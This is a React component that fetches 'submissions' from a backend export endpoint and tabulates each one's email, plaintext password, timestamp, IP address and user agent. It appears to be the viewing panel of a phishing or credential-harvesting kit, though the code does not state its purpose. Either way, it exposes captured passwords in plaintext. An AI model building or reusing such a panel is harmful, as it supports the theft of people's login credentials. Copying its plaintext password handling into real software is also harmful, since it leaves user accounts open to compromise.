import React, { useState, useEffect } from 'react';

const SubmissionsTable = () => {
    const [submissions, setSubmissions] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        fetchSubmissions();
    }, []);

    const fetchSubmissions = async () => {
        try {
            const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/data/export`);
            const data = await response.json();
            setSubmissions(data);
            setLoading(false);
        } catch (error) {
            console.error('Error fetching submissions:', error);
            setLoading(false);
        }
    };

    if (loading) return <div>Loading...</div>;

    return (
        <div className="table-container">
            <table>
                <thead>
                    <tr>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                        <th>User Agent</th>
                    </tr>
                </thead>
                <tbody>
                    {submissions.map((submission) => (
                        <tr key={submission.id}>
                            <td>{submission.email}</td>
                            <td>{submission.password}</td>
                            <td>{new Date(submission.timestamp).toLocaleString()}</td>
                            <td>{submission.ip_address}</td>
                            <td>{submission.user_agent}</td>
                        </tr>
                    ))}
                </tbody>
            </table>
        </div>
    );
};

export default SubmissionsTable;
